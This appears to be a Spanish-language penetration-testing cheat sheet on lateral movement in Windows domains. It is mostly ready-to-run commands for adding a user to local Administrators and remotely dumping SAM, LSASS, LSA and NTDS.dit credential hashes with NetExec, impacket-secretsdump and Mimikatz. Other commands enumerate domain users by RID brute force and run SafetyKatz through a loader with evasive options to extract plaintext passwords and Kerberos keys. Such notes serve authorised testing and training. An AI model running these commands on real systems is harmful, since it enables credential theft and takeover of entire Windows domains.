# Dumpear todos los hashes remotamente

Tags: #MovimientoLateral #Windows #Server 


Requisitos:
	- Usuario admin local y se parte del dominio 

TIP:  <-IMPORTANTE
- Si tienes una cuenta con permisos de administrador local en un servidor Windows, puedes agregar al grupo de administradores a un usuario normal de dominio para que el haga el dumpeo de los hashes del server Windows. Esto sería lo mejor para ir avanzando.   
- Si una cuenta del dominio ya tiene permisos de administrador local en el servidor Windows, puede hacer el dump del server sin problema


```bash 
# Saber si el usuario pertenece al grupo de administradores locales
❯ whoami /all

	BUILTIN\Administrators     <- Pertenece al grupo administradores locales 

# Si es admin local puede agregar al usuario de dominio al grupo Administrators locales de ese Server 


❯ net localgroup Administrators omar /add    # Agregar a un usuario al grupo administradores 
❯ net localgroup Administrators              # Mirar si se ha agregado al grupo 
```

## Dump All Hashes Remotamente: 

- ``SAM (--sam)``: Contiene las cuentas locales de ese Windows, como su administrador local. No es la lista de usuarios del dominio. Para extraer sus hashes hacen falta permisos de administrador local en ese equipo.
- ``LSASS (-M lsassy)``: Intenta extraer credenciales que están en memoria. Puede incluir credenciales o hashes de sesiones iniciadas en ese equipo; no equivale a “todos los usuarios que existen” ni siempre habrá material recuperable. Requiere privilegios elevados y depende de las protecciones y configuración del sistema.
- ``LSA (--lsa)``: Obtiene secretos locales protegidos por LSA, como secretos de servicios o credenciales almacenadas en el equipo. No es una lista de usuarios; el contenido depende de lo que esté configurado allí.
- ``NTDS.dit``: Es la base de datos de Active Directory del controlador de dominio, con datos de las cuentas del dominio. No se obtiene normalmente de un servidor miembro común. En un DC necesitas privilegios suficientes para acceder a la base de datos y sus secretos; Domain Admin no es siempre el único grupo que podría tener esos permisos, pero un usuario común no los tiene por defecto.

```bash 
## dump SAM - requires local admin
❯ nxc smb <IP> -u 'user1' -p 'Password1!' --sam
❯ nxc smb <IP> -u 'user1' -p 'Password1!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt

## dump LSASS - requires local admin
❯ nxc smb <IP> -u 'user1' -p 'Password1!' -M lsassy
❯ nxc smb <IP> -u 'user1' -p 'Password1!' -M nanodump
❯ nxc smb <IP> -u 'user1' -p 'Password1!' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt

## dump LSA - requires local admin
❯ nxc smb <IP> -u 'user1' -p 'Password1!' --lsa
❯ nxc smb <IP> -u 'user1' -p 'Password1!' --lsa secdump
❯ nxc smb <IP> -u 'user1' -p 'Password1!' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes

## Dump NTDS.dit - Requires domain admin or local admin on DC
❯ nxc smb <IP> -u 'user1' -p 'Password1!' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
❯ impacket-secretsdump 'user1':'Password1!'@<IP> -just-dc-ntlm -outputfile test.txt

## Get userlist of all users in the domain (do against dc to get all domain users):
❯ nxc smb <IP> -u 'user1' -p 'Password1!' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\\' -f2 | tee users.txt

## Recommended to dump with this too just in case. We wanna make sure we have all hashes:
❯ mimikatz | Hashdump
```

```bash 
# NTDS - Requiere usuario del dominio y pertenecer al grupo Administrators en DC
❯ nxc smb <IP> -u 'user1' -p 'Password1!' --ntds 
```

## Safetykatz - Mimikatz  
```powershell 
! Usuario local con permisos de Administrador 

# Ejecutar una versión modificada de Mimikatz (SafetyKatz) para extraer desde LSASS las claves Kerberos (AES, RC4, etc.) de los usuarios en memoria 
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-keys" exit      
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-logonPasswords" exit

❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 
❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 



# Extraer desde LSASS las claves de cifrado Kerberos (AES, RC4, etc.) de las sesiones de usuarios en el sistema.
❯ .\mimikatz.exe -Command "privilege::debug"  

	sekurlsa::logonpasswords
	skurlsa::logonpasswords /full
	sekurlsa::ekeys
	lsadump::lsa /patch
	lsadump::secrets
	lsadump::sam 
	token::elevate
	exit
```